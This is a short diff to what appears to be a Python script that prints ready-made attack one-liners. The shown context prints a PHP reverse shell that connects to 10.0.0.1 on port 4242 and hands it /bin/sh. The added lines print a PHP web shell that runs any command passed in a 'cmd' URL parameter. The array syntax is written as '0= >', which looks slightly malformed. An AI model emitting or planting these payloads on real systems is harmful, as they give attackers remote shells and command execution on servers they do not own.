@@ -64,6 +64,9 @@ for element in generate[0]:
         print("\nMethod 2:")
         print(f'php -r \'$sock=fsockopen("10.0.0.1", 4242);$proc=proc_open("/bin/sh -i", array(0= >$sock, 1= >$sock, 2= >$sock), $pipes)\'')
 
+        print("\nMethod 3 (as a command injection):")
+        print('<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>')
+
         print("\n------------------------------------------------------------------------")
 
     if element == "powershell":
